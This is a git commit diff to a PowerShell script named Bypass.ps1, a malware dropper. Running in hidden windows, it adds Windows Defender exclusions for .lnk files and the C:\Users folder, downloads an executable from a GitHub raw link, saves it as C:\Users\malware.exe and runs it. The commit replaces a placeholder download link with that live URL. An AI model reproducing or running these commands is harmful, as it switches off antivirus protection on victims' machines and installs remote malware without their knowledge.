0317c4dfa1a4503c7faa878b31d29874e82f2452
itsHackedOn <132865861+itsHackedOn@users.noreply.github.com>
2023-08-23 07:34:40 -0700

    Update Bypass.ps1

--- Bypass.ps1
+++ Bypass.ps1
@@ -4,6 +4,6 @@ powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
 powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
 
 
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://your-direct-downloading-link -o C:\Users\malware.exe
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/itsHackedOn/Powershell/raw/main/XClient.exe -o C:\Users\malware.exe
 powershell.exe -w Hidden C:\Users\malware.exe
 
